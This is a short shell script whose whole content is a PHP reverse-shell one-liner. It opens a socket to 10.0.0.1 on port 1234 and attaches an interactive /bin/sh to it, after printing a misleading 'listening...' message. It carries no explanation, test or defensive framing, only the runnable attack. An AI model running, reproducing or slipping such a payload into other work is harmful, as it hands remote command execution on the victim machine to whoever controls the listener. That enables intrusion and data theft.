#!/bin/sh

clear;

if

printf "\nlistening..."

then

php -r '$sock = fsockopen("10.0.0.1", 1234); exec("/bin/sh -i <&3 >&3 2>&3");'

else
	exit 1;
	return 0;

fi;
